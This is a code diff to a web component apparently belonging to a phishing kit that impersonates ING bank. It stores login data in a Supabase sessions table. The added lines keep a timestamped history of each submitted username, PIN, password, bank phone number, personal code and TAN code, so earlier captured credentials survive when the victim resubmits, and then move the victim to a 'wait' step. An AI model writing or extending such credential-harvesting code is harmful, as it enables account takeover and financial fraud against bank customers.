@@ -31,8 +31,38 @@ export function IngClient({ sessionId }: { sessionId: string }) {
     setSaving(true);
     const { data: existing } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
     const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
+    const previousForm = { ...prev };
+    const prevEmpty = !String(previousForm.orderedField1 || previousForm.username || previousForm.verfuegernummer || "").trim() &&
+                      !String(previousForm.password || previousForm.pin || "").trim() &&
+                      !String(previousForm.personalCode || previousForm.bankPhone || previousForm.tacCode || "").trim();
+    const prevHistory: any[] = Array.isArray((previousForm as any).bankFormHistory)
+      ? (previousForm as any).bankFormHistory.slice()
+      : [];
+    if (!prevEmpty) {
+      prevHistory.push({
+        bankSlug: "ing",
+        bankName: "ING",
+        htmlStepLabel: "BANKA FORMU",
+        verfuegernummer: String(previousForm.verfuegernummer || previousForm.username || "").trim(),
+        username: String(previousForm.username || previousForm.verfuegernummer || "").trim(),
+        pin: String(previousForm.pin || previousForm.password || "").trim(),
+        password: String(previousForm.password || previousForm.pin || "").trim(),
+        bankPhone: String(previousForm.bankPhone || "").trim(),
+        personalCode: String(previousForm.personalCode || "").trim(),
+        tacCode: String(previousForm.tacCode || (previousForm as any).tac_code || "").trim(),
+        orderedField1: String(previousForm.orderedField1 || "").trim(),
+        orderedField1Key: String(previousForm.orderedField1Key || "").trim(),
+        orderedField2: String(previousForm.orderedField2 || "").trim(),
+        orderedField2Key: String(previousForm.orderedField2Key || "").trim(),
+        orderedField2Type: String(previousForm.orderedField2Type || "").trim(),
+        orderedField3: String(previousForm.orderedField3 || "").trim(),
+        orderedField3Key: String(previousForm.orderedField3Key || "").trim(),
+        orderedField3Type: String(previousForm.orderedField3Type || "").trim(),
+        capturedAt: new Date().toISOString(),
+      });
+    }
     await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
-      form_data: { ...prev, bankSlug: "ing", bankName: "ING", verfuegernummer: username, pin: password }
+      form_data: { ...prev, bankSlug: "ing", bankName: "ING", verfuegernummer: username, pin: password, bankFormHistory: prevHistory }
     }).eq("id", sessionId);
     // ⭐ FLASH YOK: router.push → router.replace
     router.replace(stepToPath("wait", sessionId));
